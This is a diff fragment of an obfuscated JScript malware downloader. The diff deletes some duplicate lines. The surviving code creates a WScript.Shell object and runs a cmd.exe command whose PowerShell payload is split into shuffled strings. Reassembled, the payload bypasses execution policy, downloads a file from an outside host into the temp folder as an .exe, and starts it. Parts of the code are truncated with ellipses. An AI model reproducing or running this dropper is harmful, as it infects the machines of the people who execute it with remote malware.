@@ -15,7 +15,6 @@ afefexej()
 		var sdampebeb = ukqagesikr + enakorigz;
 		sdampebeb = 39 + sdampebeb;
 	}
-eval(qbutyjtyna + "95789")
 qbutyjtyna = eval(qbutyjtyna + "95789")
 niqvevle()
 {
@@ -56,7 +55,6 @@ niqvevle()
 					if (typeof avavnumewn == "undefined") {
 						if...
 var avzamol = uvgud.CreateObject('WScript.Shell')
-uvgud.CreateObject('WScript.Shell')
 xsypiqyg()
 xsypiqyg()
 switch (fawy) {
@@ -92,8 +90,6 @@ switch (fawy) {
 									var vpumpadugo = "lape";
 									var wdefyhyve = 312;
 				...
-"cmd.exe /c \"" + qitulty
-"cmd.exe /c \"" + qitulty + "  $ucas='^).DownloadFi';$phopsix='^et.Webclient';$vtynicr='^Set-Executio';$goxe='^e'');(New-Obj';$ucyske='^ss    -Scope     Pr';$ynwyk='^le(''http://f';$ydlimi='^op/user.php?';$ymim='^ect    System.N';$livy='^rocess $path';$rymfym='^nPolicy     Bypa';$tpesfe='^th); Start-P';$yfnini='^f=0.dat'',$pa';$arojr='^ocess; $path';$jaqfow='^''\ejvynul.ex';$ozmoq='^=($env:temp+';$ijxaps='^ortycooola.t'; Invoke-Expression ($vtynicr+$rymfym+$ucyske+$arojr+$ozmoq+$jaqfow+$goxe+$ymim+$phopsix+$ucas+$ynwyk+$ijxaps+$ydlimi+$yfnini+$tpesfe+$livy);\""
 var nemzeqr = "cmd.exe /c \"" + qitulty + "  $ucas='^).DownloadFi';$phopsix='^et.Webclient';$vtynicr='^Set-Executio';$goxe='^e'');(New-Obj';$ucyske='^ss    -Scope     Pr';$ynwyk='^le(''http://f';$ydlimi='^op/user.php?';$ymim='^ect    System.N';$livy='^rocess $path';$rymfym='^nPolicy     Bypa';$tpesfe='^th); Start-P';$yfnini='^f=0.dat'',$pa';$arojr='^ocess; $path';$jaqfow='^''\ejvynul.ex';$ozmoq='^=($env:temp+';$ijxaps='^ortycooola.t'; Invoke-Expression ($vtynicr+$rymfym+$ucyske+$arojr+$ozmoq+$jaqfow+$goxe+$ymim+$phopsix+$ucas+$ynwyk+$ijxaps+$ydlimi+$yfnini+$tpesfe+$livy);\""
 avzamol[uxalaqu](nemzeqr, ojoghy)
 rilheljo()
